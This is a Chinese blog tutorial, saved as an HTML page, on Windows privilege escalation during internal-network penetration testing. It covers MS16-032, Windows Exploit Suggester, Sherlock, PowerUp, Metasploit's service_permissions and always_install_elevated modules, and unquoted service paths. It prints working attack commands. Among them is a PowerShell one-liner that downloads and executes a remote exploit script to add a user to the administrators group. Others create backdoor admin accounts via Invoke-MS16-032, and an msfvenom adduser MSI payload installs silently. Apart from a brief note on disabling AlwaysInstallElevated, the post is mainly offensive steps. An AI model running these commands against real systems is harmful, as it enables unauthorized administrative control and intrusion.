@@ -1,0 +1,287 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="内网渗透之权限提升"><meta name="keywords" content="内网渗透"><meta name="author" content="我是小吴啦"><meta name="copyright" content="我是小吴啦"><title>内网渗透之权限提升 | Chen's Blog</title><link rel="shortcut icon" href="/4.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#系统内核溢出漏洞提权"><span class="toc-number">2.</span> <span class="toc-text">系统内核溢出漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#手动执行命令发现缺失补丁"><span class="toc-number">2.1.</span> <span class="toc-text">手动执行命令发现缺失补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用msf发现缺失补丁"><span class="toc-number">2.2.</span> <span class="toc-text">利用msf发现缺失补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Exploit-Suggester"><span class="toc-number">2.3.</span> <span class="toc-text">Windows Exploit Suggester</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell中的Shelllock脚本"><span class="toc-number">2.4.</span> <span class="toc-text">Powershell中的Shelllock脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows操作系统配置错误利用"><span class="toc-number">3.</span> <span class="toc-text">Windows操作系统配置错误利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#系统服务权限配置错误"><span class="toc-number">3.1.</span> <span class="toc-text">系统服务权限配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell提权框架-PowerUp"><span class="toc-number">3.1.1.</span> <span class="toc-text">Powershell提权框架-PowerUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit中的service-permissions模块"><span class="toc-number">3.1.2.</span> <span class="toc-text">Metasploit中的service_permissions模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注册表键值AlwaysInstallElevated"><span class="toc-number">3.2.</span> <span class="toc-text">注册表键值AlwaysInstallElevated</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Installer的相关知识"><span class="toc-number">3.2.1.</span> <span class="toc-text">Windows Installer的相关知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PathAlwaysInstallElevated漏洞产生的原因"><span class="toc-number">3.2.2.</span> <span class="toc-text">PathAlwaysInstallElevated漏洞产生的原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerUp提权框架测试"><span class="toc-number">3.2.3.</span> <span class="toc-text">PowerUp提权框架测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可信任服务路径漏洞"><span class="toc-number">3.3.</span> <span class="toc-text">可信任服务路径漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trusted-Service-Paths-漏洞产生的原因"><span class="toc-number">3.3.1.</span> <span class="toc-text">Trusted Service Paths 漏洞产生的原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#自动安装配置文件"><span class="toc-number">3.4.</span> <span class="toc-text">自动安装配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计划时间"><span class="toc-number">3.5.</span> <span class="toc-text">计划时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Empire内置模块"><span class="toc-number">3.6.</span> <span class="toc-text">Empire内置模块</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#组策略首选项提权"><span class="toc-number">4.</span> <span class="toc-text">组策略首选项提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#组策略首选项提权简介"><span class="toc-number">4.1.</span> <span class="toc-text">组策略首选项提权简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#组策略首选项提权分析"><span class="toc-number">4.2.</span> <span class="toc-text">组策略首选项提权分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#创建组策略，批量修改域中机器的本地管理员密码"><span class="toc-number">4.2.1.</span> <span class="toc-text">创建组策略，批量修改域中机器的本地管理员密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取组策略的凭据"><span class="toc-number">4.2.2.</span> <span class="toc-text">获取组策略的凭据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#组策略首选项提权防范"><span class="toc-number">4.3.</span> <span class="toc-text">组策略首选项提权防范</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过UAC提权"><span class="toc-number">5.</span> <span class="toc-text">绕过UAC提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过UAC提权的方法"><span class="toc-number">5.1.</span> <span class="toc-text">绕过UAC提权的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF的bypassuac模块"><span class="toc-number">5.1.1.</span> <span class="toc-text">MSF的bypassuac模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF的RunAs模块"><span class="toc-number">5.1.2.</span> <span class="toc-text">MSF的RunAs模块</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">我是小吴啦</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">82</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://jagger2zr.com" target="_blank" rel="noopener">Jagger</a><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">mochazz学长</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/bflw/" target="_blank" rel="noopener">强哥</a><a class="author-info-links__name text-center" href="http://p0desta.com/" target="_blank" rel="noopener">p0desta</a><a class="author-info-links__name text-center" href="https://github.com/Bypass007" target="_blank" rel="noopener">Bypass师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">内网渗透之权限提升</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>windows中的权限大质分成：<code>User,Administrator,System</code>，还有一个<code>TrustedInstaller</code>，最后一种基本不涉及。</p>
+<p>之所以需要权限提升，这是因为有些操作是需要<code>administrator权限才能做到的</code>，比如我们可以通过令牌窃取等将<code>administrator</code>的权限提升至<code>System</code>权限，以便Dumphash等</p>
+<p><code>纵向提权</code>：低权限角色获得高权限角色的权限。</p>
+<p><code>横向提权</code>：获取同级别角色的权限。</p>
+<p>常见的提权方法：<code>系统内核溢出漏洞提权，数据库提权，错误的系统配置提权，组策略首选提权，web中间件漏洞提权，DLL劫持提权，滥用高权限令牌提权，第三方服务提权</code>以及<code>bypassUAC</code></p>
+<a id="more"></a>
+
+<p>参考：《内网安全攻防》</p>
+<p>所用域环境：c0okb.org</p>
+<p>提权框架PowerUp使用参考：<a href="http://www.vuln.cn/6436" target="_blank" rel="noopener">http://www.vuln.cn/6436</a></p>
+<h1 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h1><p>攻击者利用该漏洞的关键是目标系统没有及时安装补丁，攻击者通过该漏洞进行内核溢出提权。该提权方法的关键点就是要找到系统中未及时安装补丁的漏洞。</p>
+<h2 id="手动执行命令发现缺失补丁"><a href="#手动执行命令发现缺失补丁" class="headerlink" title="手动执行命令发现缺失补丁"></a>手动执行命令发现缺失补丁</h2><p>在获得shell后，输入<code>whoami /groups</code>，查看当前用户的权限</p>
+<p>如果是<code>administrator</code>，那么查看结果如下：</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/1.png" alt="image-20200808143242442"></p>
+<p>如果是一般的域内用户</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/2.png" alt="image-20200808143415182"></p>
+<p>那么查看结果如下：</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/3.png" alt="image-20200808143524344"></p>
+<p>所以提权的目的就是将<code>用户的权限从普通用户提升到管理员权限</code>，也就是从<code>Medium Mandatory Level</code>提升到<code>Hig Mandatory Level</code></p>
+<p>执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">或者</span><br><span class="line">wmic qfe Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/4.png" alt="image-20200808144738129"></p>
+<p><code>MS16-032</code>漏洞的补丁编号为<code>KB3139914</code>，那么在这里就存在这个漏洞，我们可以通过该漏洞进行提权。通过这个漏洞，我们可以执行任意程序。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-&gt; . .\Invoke-MS16<span class="number">-032.</span>ps1</span><br><span class="line">-&gt; Invoke-MS16<span class="number">-032</span> -Application cmd.exe -Commandline <span class="string">"/c net user test2 1qaz@WSX /add"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/5.png" alt="image-20200808155728429"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/6.png" alt="image-20200808155752542"></p>
+<p>接着执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; Invoke-MS16<span class="number">-032</span> -Application cmd.exe -Commandline <span class="string">"/c net localgroup administrators test2 /add"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test2</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/7.png" alt="image-20200808160036882"></p>
+<p>可以看到<code>test2</code>的权限已经提升到管理员权限。</p>
+<p>同样我们也可以通过powershell远程下载，一句话执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net localgroup administrators zhuzhuxia /add'"</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://www.jianshu.com/p/c7fe1014e627" target="_blank" rel="noopener">MS16-032漏洞利用</a></p>
+<h2 id="利用msf发现缺失补丁"><a href="#利用msf发现缺失补丁" class="headerlink" title="利用msf发现缺失补丁"></a>利用msf发现缺失补丁</h2><p>利用msf中的模块：<code>post/windows/gather/enum_patches</code></p>
+<p>参考:<a href="https://www.cnblogs.com/liqik/p/12988386.html" target="_blank" rel="noopener">后渗透（三）信息收集</a></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/8.png" alt="image-20200809003149968"></p>
+<h2 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h2><p>这个工具会将系统中已经安装好的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，<code>而其需要的只有目标系统的信息</code></p>
+<p><strong>使用systeminfo获得当前系统的补丁安装情况，并将补丁信息导入到patches.txt文件中</strong></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/9.png" alt="image-20200809004109184"></p>
+<p><strong>更新安全公告数据库</strong></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/10.png" alt="image-20200809003912920"></p>
+<p><strong>安装xlrd模块</strong></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/11.png" alt="image-20200809004922782"></p>
+<p><strong>执行命令，检查系统中是否存在未修复的漏洞</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./windows-exploit-suggester.py -d <span class="number">2020</span><span class="number">-08</span><span class="number">-08</span>-mssb.xls -i patches.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/12.png" alt="image-20200809005222143"></p>
+<p>可以看到系统中存在<code>MS16-135</code>，<code>MS16-098</code>等漏洞，需要及时修复，攻击者只要利用这些漏洞。就能获取目标系统的System权限。</p>
+<h2 id="Powershell中的Shelllock脚本"><a href="#Powershell中的Shelllock脚本" class="headerlink" title="Powershell中的Shelllock脚本"></a>Powershell中的Shelllock脚本</h2><p>该脚本可以快速找到可能用于本地权限提升的漏洞</p>
+<p>通过msf将该脚本上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="string">'/home/kali/tool/Sherlock/Sherlock.ps1'</span> <span class="string">'C:\\Users\test\DesktopSherlock.ps1'</span></span><br></pre></td></tr></table></figure>
+
+<p>然后执行该脚本</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/13.png" alt="image-20200809010622140"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/14.png" alt="image-20200809011122935"></p>
+<p>效果和Windows Exploit Suggester差不多，个人认为还是Windows Exploit Suggester更好用一些。</p>
+<h1 id="Windows操作系统配置错误利用"><a href="#Windows操作系统配置错误利用" class="headerlink" title="Windows操作系统配置错误利用"></a>Windows操作系统配置错误利用</h1><p><strong>在windows系统中，如果遇到无法通过系统内核溢出漏洞提取所在服务器权限的情况，就会利用系统中的配置错误来提权</strong></p>
+<p>windows中常见的配置错误包括管理员凭据配置错误，服务配置错误，故意削弱的安全措施，用户权限过高等。</p>
+<h2 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h2><p>Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件</p>
+<p><strong>如果一个低权限用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限</strong></p>
+<p><strong>Windows服务是以System权限运行的，因此，其文件夹，文件和注册表键值都是受强访问控制机制保护的。但是，在某些情况下，操作系统还是存在一些没有得到有效保护的服务</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">系统服务权限配置错误有如下两种情况：</span><br><span class="line">	(<span class="number">1</span>)账号未运行：攻击者会使用任意服务替换原来服务，然后重启服务。</span><br><span class="line">	(<span class="number">2</span>)服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用情景，攻击者通常会利用DLL劫持技术并尝试重启服务提权。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Powershell提权框架-PowerUp"><a href="#Powershell提权框架-PowerUp" class="headerlink" title="Powershell提权框架-PowerUp"></a>Powershell提权框架-PowerUp</h3><p><strong>此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</strong></p>
+<p>参考:<a href="http://www.vuln.cn/6436" target="_blank" rel="noopener">Powershell 提权框架-Powerup – Evi1cg</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module .\PowerUp.ps1;  Invoke-AllChecks | Out-File -Encoding ASCII check.txt&#125;"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/15.png" alt="image-20200809121106463"></p>
+<p>将测试结果保存在<code>check.txt</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download <span class="string">'C:\\Users\test\Desktop\check.txt'</span> <span class="string">'/home/kali/tool/check.txt'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/16.png" alt="image-20200809121203755"></p>
+<p>可以看出，PowerUp列出了可能存在问题的所有服务，并在AbuseFunction部分直接给出了利用方式。</p>
+<p>除此之外，在msf中也有执行powershell的模块</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/17.png" alt="image-20200809121455418"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/18.png" alt="image-20200809121606311"></p>
+<h3 id="Metasploit中的service-permissions模块"><a href="#Metasploit中的service-permissions模块" class="headerlink" title="Metasploit中的service_permissions模块"></a>Metasploit中的service_permissions模块</h3><p>在Metasploit中，对应的利用模块是<code>service_permissions</code>，选择<code>AGGRESSIVE</code>选项，可以利用目标机器上每一个有缺陷的服务。该选项被禁用时，该模块在第一次提权成功后将会停止工作。</p>
+<p>可以看到在此时通过该模块对获得session进行提权处理，获得了SYSTEM权限。</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/19.png" alt="image-20200809122838015"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service_permissons模块使用两种方法获得System权限：</span><br><span class="line">	（<span class="number">1</span>）如果meterpreter以管理员权限运行，该模块会尝试创建并运行一个服务。</span><br><span class="line">	（<span class="number">2</span>）如果当前权限不允许创建服务，该模块会判断哪些服务的文件夹或者文件夹的权限的问题，并允许对其劫持。</span><br><span class="line">在创建服务或者劫持已经存在的服务时，该模块会创建一个可执行程序，其文件和安装路径是随机的，</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="注册表键值AlwaysInstallElevated"><a href="#注册表键值AlwaysInstallElevated" class="headerlink" title="注册表键值AlwaysInstallElevated"></a>注册表键值AlwaysInstallElevated</h2><p>注册键<code>AlwaysInstallElevated</code>是一个策略设置项。Windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，<strong>那么任何权限用户都能以<code>NT AUTHORITY\SYSTEM</code>权限来安装恶意的<code>MSI(Microsoft Windows Installer)</code>文件</strong>。</p>
+<h3 id="Windows-Installer的相关知识"><a href="#Windows-Installer的相关知识" class="headerlink" title="Windows Installer的相关知识"></a>Windows Installer的相关知识</h3><p>Windows Installer 是Windows操作系统的组件之一，专门用来管理和配置软件服务。Windows Installer除了是一个安装程序，还用于管理软件的安装，管理软件组件的添加和删除，监视文件的还原，通过回滚进行灾难恢复等。</p>
+<p>Windows Installer 分为<code>客户端安装服务（Msiexec.exe）</code>和<code>MSI文件</code>两部分，它们是一起工作的。Windows Installer通过<code>Msiexec.exe</code>安装<code>MSI</code>文件包含的程序。</p>
+<p><code>MSI</code>文件是Windows Installer的数据包，它实际上包含是一个数据库，包含安装和卸载软件时需要使用的大量指令和数据。</p>
+<p><code>Msiexec.exe</code>用于安装<code>MSI</code>文件，一般在运行<code>Micosoft Update</code>安装更新或者安装一些软件时使用。</p>
+<h3 id="PathAlwaysInstallElevated漏洞产生的原因"><a href="#PathAlwaysInstallElevated漏洞产生的原因" class="headerlink" title="PathAlwaysInstallElevated漏洞产生的原因"></a>PathAlwaysInstallElevated漏洞产生的原因</h3><p><strong>该漏洞产生的原因是用户开启了Windows Installer特权安装功能</strong></p>
+<p>组策略编辑器：<code>gpedit.msc</code></p>
+<p>注册表编辑器：<code>regedit</code></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/20.png" alt="image-20200809141405899"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/21.png" alt="image-20200809141516370"></p>
+<p>启用这两个设置</p>
+<h3 id="PowerUp提权框架测试"><a href="#PowerUp提权框架测试" class="headerlink" title="PowerUp提权框架测试"></a>PowerUp提权框架测试</h3><p>使用<code>PowerUp</code>的<code>Get-RegistryAlwaysInstallElevated</code>模块来检查注册表键是否被设置。</p>
+<p>如果<code>AlwaysInstallElevated</code>注册键已经被设置，就意味着<code>MSI</code>文件是以<code>System</code>权限运行的。运行该模块的命令如下，”True”表示已经设置。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass IEX (<span class="keyword">NEW</span>-Object Net.WebClient).DownloadString(<span class="string">'c:\\Users\test\Desktop\PowerUp.ps1'</span>); Get-RegistryAlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/22.png" alt="image-20200809145535330"></p>
+<p>然后运行<code>Write-UserAddMSI</code>模块，生成一个MSI文件</p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/23.png" alt="image-20200809150538806"></p>
+<p>运行<code>MSI</code>文件,就会添加一个管理员账户</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /q /i UserAdd.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/24.png" alt="image-20200809153643140"></p>
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/25.png" alt="image-20200809153808526"></p>
+<p>除此之外，我们还能通过<code>msfvenom</code>来生成木马，配合meterpreter使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f msi -p windows/adduser USER=wu13dog PASS=<span class="number">1</span>qaz@WSX -o /home/kali/tool/Userdog.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/26.png" alt="image-20200809154751257"></p>
+<p>执行命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i Userdog.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/27.png" alt="image-20200809155031073"></p>
+<p>msf下也有<strong>自动化的模块</strong>供我们提权使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/always_install_elevated</span><br></pre></td></tr></table></figure>
+
+<p>使用起来比较简单，详情参考：<a href="https://www.cnblogs.com/-qing-/p/10557520.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10557520.html</a></p>
+<p><strong>PS:防止MSI文件提权，就是禁用注册表AlwaysInstallElevated</strong></p>
+<h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h2><p>可信任服务路径漏洞（包含空格且没有引号的路径）利用了Windows文件路径解析的特性，并涉及服务路径的文件/文件夹权限（存在缺陷的服务程序利用了属于可执行文件的文件/文件夹的权限）。<strong>如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。</strong>也就是说，<strong>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务是有漏洞的</strong>。</p>
+<p>该漏洞存在如下两种可能。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果路径和服务有关，就任意创建一个服务或编译Service模块</span><br><span class="line">如果路径与可执行文件有关，就任意创建一个可执行文件。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Trusted-Service-Paths-漏洞产生的原因"><a href="#Trusted-Service-Paths-漏洞产生的原因" class="headerlink" title="Trusted Service Paths 漏洞产生的原因"></a>Trusted Service Paths 漏洞产生的原因</h3><p>因为Windows服务通常都是以System权限运行的，所以系统解析服务所对应的文件路径中的空格时，也会以系统权限进行。</p>
+<p>这个漏洞也是开发者在开发时，没有注意到的问题</p>
+<p>参考：<a href="https://www.cnblogs.com/sevck/p/8488469.html" target="_blank" rel="noopener">https://www.cnblogs.com/sevck/p/8488469.html</a></p>
